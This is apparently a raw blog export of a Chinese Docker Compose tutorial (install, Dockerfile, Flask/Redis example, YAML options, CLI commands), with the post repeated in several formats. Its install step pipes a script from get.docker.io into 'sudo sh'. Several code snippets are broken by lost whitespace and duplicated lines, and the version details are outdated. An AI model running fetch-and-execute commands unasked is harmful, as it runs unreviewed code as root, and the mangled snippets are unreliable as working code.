docker-compose\n```\n这样compose就安装好了，查看一下compose的版本信息：\n\n```bash\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0\n```\n## 2. 使用Compose\n使用Compose只需要简单的三个步骤：\n\n首先，使用Dockerfile来定义你的应用环境：\n```bash\nFROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt\n```\n其中，requirements.txt中的内容包括：\n\n```bash\nflask\nredis\n```\n再用Python写一个简单的app.py\n```python\nfrom flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)\n```\n第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用\n```bash\nweb:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis\n```\n第三步，执行``docker-compose up``来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。\n```bash\nCreating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---> d833e0b23482\nStep 1 : ADD . /code\n ---> 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---> Running in f495a62feac9\n ---> ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat\n```\n## 3. Yaml文件参考\n\n在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\n\nimage:镜像的ID\n\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\n\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\n\nexternal_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\n\ncommand：替换默认的command命令\n\nports: 导出端口。格式可以是：\n\n```\nports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"\n```\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\n\nvolumes：加载路径作为卷，可以指定只读模式。\n```\nvolumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro\n ```\n volumes_from：加载其他容器或者服务的所有卷\n```\nenvironment:- RACK_ENV=development\n  - SESSION_SECRET\n```\nenv_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development\n\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\n```\ncommon.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres\n```\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。\ndns：可以设置一个或多个自定义的DNS地址。\n\ndns_search:可以设置一个或多个DNS的扫描域。\n\n其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：\n\n```\ncpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true\n```\n## 4. docker-compose常用命令\n\n在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：\n\n--verbose：输出详细信息\n\n-f 制定一个非docker-compose.yml命名的yaml文件\n\n-p 设置一个项目名称（默认是directory名）\n\ndocker-compose的动作包括：\n\nbuild：构建服务\n\nkill -s SIGINT：给服务发送特定的信号。\n\nlogs：输出日志\n\nport：输出绑定的端口\n\nps：输出运行的容器\n\npull：pull服务的image\n\nrm：删除停止的容器\n\nrun: 运行某个服务，例如docker-compose run web\npython manage.py shell\n\nstart：运行某个服务中存在的容器。\n\nstop:停止某个服务中存在的容器。\n\nup：create + run + attach容器到服务。\n\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\n>转载:http://debugo.com/docker-compose\n                                   \n","source":"_posts/Docker-Compose—简化复杂应用的利器.md","raw":"---\ntitle: 'Docker Compose—简化复杂应用的利器 '\ndate: 2016-10-15 19:10:35\ntags: docker\ncategories: docker\n---\nCompose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。\n<!-- more --> \n## 1. 安装Docker和Compose\n```bash\n# 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n```\n```bash\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\n\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n\n当前最新的Docker是1.6.2，Compose为1.2.0\n```bash\nsudo apt-get update\nsudo apt-get install lxc-docker\n```\n参考 http://docs.docker.com/compose/install/#install-compose\n```bash\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose\n\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n这样compose就安装好了，查看一下compose的版本信息：\n\n```bash\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0\n```\n## 2. 使用Compose\n使用Compose只需要简单的三个步骤：\n\n首先，使用Dockerfile来定义你的应用环境：\n```bash\nFROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt\n```\n其中，requirements.txt中的内容包括：\n\n```bash\nflask\nredis\n```\n再用Python写一个简单的app.py\n```python\nfrom flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)\n```\n第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用\n```bash\nweb:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis\n```\n第三步，执行``docker-compose up``来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。\n```bash\nCreating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---> d833e0b23482\nStep 1 : ADD . /code\n ---> 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---> Running in f495a62feac9\n ---> ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat\n```\n## 3. Yaml文件参考\n\n在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\n\nimage:镜像的ID\n\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\n\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\n\nexternal_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\n\ncommand：替换默认的command命令\n\nports: 导出端口。格式可以是：\n\n```\nports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"\n```\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\n\nvolumes：加载路径作为卷，可以指定只读模式。\n```\nvolumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro\n ```\n volumes_from：加载其他容器或者服务的所有卷\n```\nenvironment:- RACK_ENV=development\n  - SESSION_SECRET\n```\nenv_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development\n\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\n```\ncommon.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres\n```\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。\ndns：可以设置一个或多个自定义的DNS地址。\n\ndns_search:可以设置一个或多个DNS的扫描域。\n\n其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：\n\n```\ncpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true\n```\n## 4. docker-compose常用命令\n\n在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：\n\n--verbose：输出详细信息\n\n-f 制定一个非docker-compose.yml命名的yaml文件\n\n-p 设置一个项目名称（默认是directory名）\n\ndocker-compose的动作包括：\n\nbuild：构建服务\n\nkill -s SIGINT：给服务发送特定的信号。\n\nlogs：输出日志\n\nport：输出绑定的端口\n\nps：输出运行的容器\n\npull：pull服务的image\n\nrm：删除停止的容器\n\nrun: 运行某个服务，例如docker-compose run web\npython manage.py shell\n\nstart：运行某个服务中存在的容器。\n\nstop:停止某个服务中存在的容器。\n\nup：create + run + attach容器到服务。\n\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\n>转载:http://debugo.com/docker-compose\n                                   \n","slug":"Docker-Compose—简化复杂应用的利器","published":1,"updated":"2016-11-19T12:09:26.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300d0008cdonnug9xmxw","content":"<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br><a id=\"more\"></a> </p>\n<h2 id=\"1-安装Docker和Compose\"><a href=\"#1-安装Docker和Compose\" class=\"headerlink\" title=\"1. 安装Docker和Compose\"></a>1. 安装Docker和Compose</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"line\">curl <span class=\"_\">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div><div class=\"line\"><span class=\"comment\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class=\"_\">-s</span>`-`uname -m` &amp;gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\"></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure>\n<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>\n<p>参考 <a href=\"http://docs.docker.com/compose/install/#install-compose\" target=\"_blank\" rel=\"external\">http://docs.docker.com/compose/install/#install-compose</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"></div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">docker-compose -version</div><div class=\"line\">docker-compose 1.2.0</div></pre></td></tr></table></figure>\n<h2 id=\"2-使用Compose\"><a href=\"#2-使用Compose\" class=\"headerlink\" title=\"2. 使用Compose\"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>\n<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">FROM python:2.7</div><div class=\"line\">ADD ./code</div><div class=\"line\">WORKDIR /code</div><div class=\"line\">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">flask</div><div class=\"line\">redis</div></pre></td></tr></table></figure>\n<p>再用Python写一个简单的app.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> flask importFlaskfrom redis importRedisimport os</div><div class=\"line\">app =Flask(__name__)</div><div class=\"line\">redis =Redis(host=<span class=\"string\">'redis'</span>, port=<span class=\"number\">6379</span>)@app.route(<span class=\"string\">'/'</span>)<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    redis.incr(<span class=\"string\">'hits'</span>)<span class=\"keyword\">return</span><span class=\"string\">'Hello World! I have been seen %s times.'</span>% redis.get(<span class=\"string\">'hits'</span>)<span class=\"keyword\">if</span> __name__ ==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, debug=<span class=\"keyword\">True</span>)</div></pre></td></tr></table></figure></p>\n<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">web:</div><div class=\"line\">  build:.</div><div class=\"line\">  <span class=\"built_in\">command</span>: python app.py</div><div class=\"line\">  ports:</div><div class=\"line\">         - <span class=\"string\">\"5000:5000\"</span></div><div class=\"line\">  volumes:</div><div class=\"line\">         - .:/code</div><div class=\"line\">  links:</div><div class=\"line\">         - redis</div><div class=\"line\">redis:</div><div class=\"line\">  image: redis</div></pre></td></tr></table></figure></p>\n<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">Creating myapp_redis_1...</div><div class=\"line\">Creating myapp_web_1...</div><div class=\"line\">Building web...</div><div class=\"line\">Step 0 : FROM python:2.7</div><div class=\"line\">2.7: Pulling from python</div><div class=\"line\">...</div><div class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> python:2.7</div><div class=\"line\"> ---&gt; d833e0b23482</div><div class=\"line\">Step 1 : ADD . /code</div><div class=\"line\"> ---&gt; 1c04b1b15808</div><div class=\"line\">Removing intermediate container 9dab91b4410d</div><div class=\"line\">Step 2 : WORKDIR /code</div><div class=\"line\"> ---&gt; Running <span class=\"keyword\">in</span> f495a62feac9</div><div class=\"line\"> ---&gt; ffea89a7b090</div><div class=\"line\">Attaching to myapp_redis_1, myapp_web_1</div><div class=\"line\">......</div><div class=\"line\">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class=\"line\">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class=\"line\">web_1   |  * Restarting with <span class=\"built_in\">stat</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-Yaml文件参考\"><a href=\"#3-Yaml文件参考\" class=\"headerlink\" title=\"3. Yaml文件参考\"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>\n<p>image:镜像的ID</p>\n<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>\n<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>\n<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>\n<p>command：替换默认的command命令</p>\n<p>ports: 导出端口。格式可以是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>\n<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>\n<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">volumes:-/var/lib/mysql</div><div class=\"line\"> - cache/:/tmp/cache</div><div class=\"line\"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>\n<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">environment:- RACK_ENV=development</div><div class=\"line\">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>\n<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>\n<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">common.yml</div><div class=\"line\">webapp:</div><div class=\"line\">  build:./webapp</div><div class=\"line\">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class=\"line\">development.yml</div><div class=\"line\">web:extends:</div><div class=\"line\">    file: common.yml</div><div class=\"line\">    service: webapp</div><div class=\"line\">  ports:-&quot;8000:8000&quot;</div><div class=\"line\">  links:- db</div><div class=\"line\">  environment:- DEBUG=true</div><div class=\"line\">db:</div><div class=\"line\">  image: postgres</div></pre></td></tr></table></figure></p>\n<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>\n<p>dns_search:可以设置一个或多个DNS的扫描域。</p>\n<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">cpu_shares:73</div><div class=\"line\">working_dir:/code</div><div class=\"line\">entrypoint: /code/entrypoint.sh</div><div class=\"line\">user: postgresql</div><div class=\"line\">hostname: foo</div><div class=\"line\">domainname: foo.com</div><div class=\"line\">mem_limit:1000000000</div><div class=\"line\">privileged:true</div><div class=\"line\">restart: always</div><div class=\"line\">stdin_open:true</div><div class=\"line\">tty:true</div></pre></td></tr></table></figure>\n<h2 id=\"4-docker-compose常用命令\"><a href=\"#4-docker-compose常用命令\" class=\"headerlink\" title=\"4. docker-compose常用命令\"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>\n<p>–verbose：输出详细信息</p>\n<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>\n<p>-p 设置一个项目名称（默认是directory名）</p>\n<p>docker-compose的动作包括：</p>\n<p>build：构建服务</p>\n<p>kill -s SIGINT：给服务发送特定的信号。</p>\n<p>logs：输出日志</p>\n<p>port：输出绑定的端口</p>\n<p>ps：输出运行的容器</p>\n<p>pull：pull服务的image</p>\n<p>rm：删除停止的容器</p>\n<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>\n<p>start：运行某个服务中存在的容器。</p>\n<p>stop:停止某个服务中存在的容器。</p>\n<p>up：create + run + attach容器到服务。</p>\n<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\" target=\"_blank\" rel=\"external\">http://debugo.com/docker-compose</a></p>\n</blockquote>\n","excerpt":"<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br>","more":"</p>\n<h2 id=\"1-安装Docker和Compose\"><a href=\"#1-安装Docker和Compose\" class=\"headerlink\" title=\"1. 安装Docker和Compose\"></a>1. 安装Docker和Compose</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"line\">curl <span class=\"_\">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div><div class=\"line\"><span class=\"comment\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class=\"_\">-s</span>`-`uname -m` &amp;gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\"></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure>\n<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>\n<p>参考 <a href=\"http://docs.docker.com/compose/install/#install-compose\">http://docs.docker.com/compose/install/#install-compose</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"></div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">docker-compose -version</div><div class=\"line\">docker-compose 1.2.0</div></pre></td></tr></table></figure>\n<h2 id=\"2-使用Compose\"><a href=\"#2-使用Compose\" class=\"headerlink\" title=\"2. 使用Compose\"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>\n<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">FROM python:2.7</div><div class=\"line\">ADD ./code</div><div class=\"line\">WORKDIR /code</div><div class=\"line\">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">flask</div><div class=\"line\">redis</div></pre></td></tr></table></figure>\n<p>再用Python写一个简单的app.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> flask importFlaskfrom redis importRedisimport os</div><div class=\"line\">app =Flask(__name__)</div><div class=\"line\">redis =Redis(host=<span class=\"string\">'redis'</span>, port=<span class=\"number\">6379</span>)@app.route(<span class=\"string\">'/'</span>)<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    redis.incr(<span class=\"string\">'hits'</span>)<span class=\"keyword\">return</span><span class=\"string\">'Hello World! I have been seen %s times.'</span>% redis.get(<span 